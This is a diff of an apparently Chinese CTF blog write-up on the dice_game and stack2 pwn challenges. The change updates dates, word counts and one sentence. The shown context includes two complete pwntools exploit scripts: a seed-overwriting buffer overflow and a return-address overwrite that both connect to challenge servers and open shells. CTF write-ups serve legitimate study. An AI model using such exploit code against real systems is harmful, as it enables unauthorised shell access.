@@ -95,7 +95,7 @@
 <meta property="og:image" content="https://s2.ax1x.com/2019/09/02/nid579.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/09/03/nk39Ln.png">
 <meta property="og:image" content="c:/Users/chessman/AppData/Roaming/Typora/typora-user-images/1567498815939.png">
-<meta property="og:updated_time" content="2019-09-03T13:59:55.468Z">
+<meta property="og:updated_time" content="2019-09-08T09:11:08.672Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="攻防世界自闭之路&lt;二&gt;">
 <meta name="twitter:description" content="自古有一就有二，有二也不一定有三。鸽子才是本质。">
@@ -308,8 +308,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-03T21:59:55+08:00">
-                2019-09-03
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-08T17:11:08+08:00">
+                2019-09-08
               </time>
             
           </span>
@@ -336,7 +336,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  731 字
+                  748 字
                 </span>
               
 
@@ -379,7 +379,7 @@
 <p>覆盖seed随机值</p>
 </blockquote>
 <h2 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h2><p> <img src="https://s2.ax1x.com/2019/08/24/mykjgJ.png" alt></p>
-<p>原函数中的意思是猜50次随机数，才能直接进入函数/bin/sh。在前面一篇的一个题目是一样的解法。就不多bb了，直接上exp</p>
+<p>原函数中的意思是猜50次随机数，才能直接进入函数/bin/sh。在前面一篇的一个题目是一样的解法。主要是缓存区溢出，覆盖seed值，控制随机数。就不多bb了，直接上exp</p>
 <h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p =process("./dice_game")</span></span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">38522</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x40</span> * <span class="string">'A'</span> +p64(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,payload)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">libc.srand(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">":"</span>,str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h1><blockquote>
 <p>覆盖地址段，跳转到合适的位置</p>
@@ -390,7 +390,7 @@
 <h2 id="ida查看伪代码"><a href="#ida查看伪代码" class="headerlink" title="ida查看伪代码"></a>ida查看伪代码</h2><p> <img src="https://s2.ax1x.com/2019/09/03/nk39Ln.png" alt></p>
 <p>一长段代码里面能看到的这个函数的基本功能是一个计算器的菜单格式，漏洞在再次更改之后的地方。程序没有限制这个的大小就能直接跳转函数的地址偏移，也就是说我不管更改哪里的地址在函数中都是可行的。这道题我以为题解看到这里我就能做了，然后我就去做了，漏洞都找到了，就好办了，我是这么想的。</p>
 <p>但是很迷，偏移算不对。理论上来说直接覆盖完栈就可了，直接拿来就算的话就是0x74的值，但是这个不对。题解里面说动态调试，那就现学一波动态调试。ida的动态调试参考<a href="https://blog.csdn.net/abc_670/article/details/80066817" target="_blank" rel="noopener">这篇文章</a> 配置完之后直接用你就能直接动态调试到数据段的值。拿到偏移是0x84，也就是覆盖0x84-0x88的。虽然动态调试了，这个题为什么偏移上的不同还是没有明白。</p>
-<p>函数本身就有/bin/bash值，地址为0x0804859b由于存进内存中之后读取地址是反过来的，地址` /0x155/0x133/0x04/0x08。</p>
+<p>函数本身就有/bin/bash值，地址为0x0804859b由于存进内存中之后读取地址是反过来的，地址<code>/0x155/0x133/0x04/0x08</code> 。</p>
 <p> <img src="C:\Users\chessman\AppData\Roaming\Typora\typora-user-images\1567498815939.png" alt></p>
 <p>​    但是在环境中没有/bin/bash。所以直接改成/bin/sh的值。原来的函数段里面就有system的值。直接利用值就行了。这个没得payload写 就直接放exp算了。</p>
 <h2 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"47.96.239.28"</span>, <span class="string">'2333'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'1\n5\n3\n132\n80\n3\n133\n132\n3\n134\n4\n3\n135\n8'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'3\n140\n135\n3\n141\n137\n3\n142\n4\n3\n143\n8'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
@@ -621,7 +621,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">6.4k</span>
+    <span title="Site words total count">6.5k</span>
   
 </div>
 
